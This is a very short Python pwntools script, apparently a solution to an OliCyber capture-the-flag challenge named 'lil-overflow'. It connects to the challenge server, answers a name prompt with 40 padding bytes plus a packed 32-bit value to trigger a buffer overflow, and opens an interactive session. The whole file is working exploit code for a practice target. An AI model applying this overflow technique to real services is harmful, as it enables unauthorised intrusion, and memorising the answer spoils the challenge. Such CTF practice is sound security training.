from pwn import *

r = remote('lil-overflow.challs.olicyber.it', 34002)

r.recvuntil('name?')
r.sendline(b'a'*40 + p32(95099824))
r.interactive()